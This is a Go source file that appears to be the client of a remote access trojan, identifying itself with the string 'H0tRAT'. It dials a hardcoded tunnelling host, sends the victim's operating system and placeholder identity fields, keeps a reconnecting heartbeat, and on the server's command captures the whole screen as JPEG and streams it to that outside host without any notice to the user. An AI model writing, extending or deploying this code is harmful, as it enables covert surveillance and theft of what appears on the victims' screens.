package client

import (
	"bufio"
	"bytes"
	"fmt"
	"github.com/go-vgo/robotgo"
	"image/jpeg"
	"net"
	"runtime"
	"strconv"
	"sync"
	"time"
	"ylc/src/demo/util"
)

const (
	IP   = "qq80378994.e2.luyouxia.net:28602"
	PORT = 1010
)

const (
	VERSION = "1.0.0"
)

var isturn = true

var wg sync.WaitGroup

func Ma() {

	connectNew()

}

func heartbeat(conn net.Conn, interval time.Duration) {
	for {
		fmt.Println("连接了==========")
		time.Sleep(interval)
		writer := bufio.NewWriter(conn)
		//创建心跳
		_, err := fmt.Fprintln(writer, -1)
		if err != nil {
			fmt.Println(err)
			//重连
			connectNew()
			return
		}
	}
	wg.Done() // 协程计数器加-1
}

func connectNew() {

	wg.Add(2) // 协程计数器 +1
	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "qq80378994.e2.luyouxia.net:28602")
	fmt.Println(inetSocketAddress)
	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
	if err != nil {
		fmt.Println(err)
	}
	//defer socket.Close()
	// IO流
	dataOutputStream := bufio.NewWriter(socket)

	// 发送信息
	fmt.Fprintln(dataOutputStream, "H0tRAT")
	fmt.Fprintln(dataOutputStream, "USER")
	fmt.Fprintln(dataOutputStream, "HOSTNAME")
	fmt.Fprintln(dataOutputStream, runtime.GOOS)
	fmt.Fprintln(dataOutputStream, IP)
	fmt.Fprintln(dataOutputStream, "测试地址")
	fmt.Fprintln(dataOutputStream, "测试名字")
	fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
	fmt.Fprintln(dataOutputStream, "测试")
	fmt.Fprintln(dataOutputStream, VERSION)
	fmt.Fprintln(dataOutputStream, "360")

	dataOutputStream.Flush()
	// 协程计数器加-1
	go doSomeThing(socket)
	go heartbeat(socket, time.Second)

	wg.Wait() //等待协程计数器为0 退出
	fmt.Println("abc========================")

}

func createScreen(socket net.Conn) {
	// 获取当前屏幕的大小

	util.SendHead(1, socket)
	for {
		//time.Sleep(time.Millisecond * 300)

		screen, err := CaptureScreenAsJPEG(80)
		if err != nil {
			fmt.Println(err)
		}
		////compress := util.Compress(screen)

		util.Send(2, screen, socket)
		fmt.Println("发送成功")
	}
}

// CaptureScreenAsJPEG 截图并返回JPEG格式的字节数组
func CaptureScreenAsJPEG(quality int) ([]byte, error) {
	// 获取屏幕的尺寸
	screenX, screenY := robotgo.GetScreenSize()
	// 创建一个矩形，表示要截取的区域
	// 截取屏幕区域
	bitmap := robotgo.CaptureScreen(0, 0, screenX, screenY)
	// 释放内存
	defer robotgo.FreeBitmap(bitmap)
	// 转换为图片对象
	img := robotgo.ToImage(bitmap)

	// 设置JPEG压缩参数
	var opt jpeg.Options
	opt.Quality = quality

	// 编码为JPEG格式
	buf := new(bytes.Buffer)
	err := jpeg.Encode(buf, img, &opt)
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}
func doSomeThing(socket net.Conn) {
	for {
		time.Sleep(time.Millisecond)
		reader := bufio.NewReader(socket)
		receiveHead := util.ReceiveHead(reader)

		fmt.Println(receiveHead)
		switch string(receiveHead) {
		//心跳
		case string(0):
			fmt.Println("heart...")

		//屏幕监控
		case string(1):
			go createScreen(socket)
		}
	}
	wg.Done() // 协程计数器加-1

}
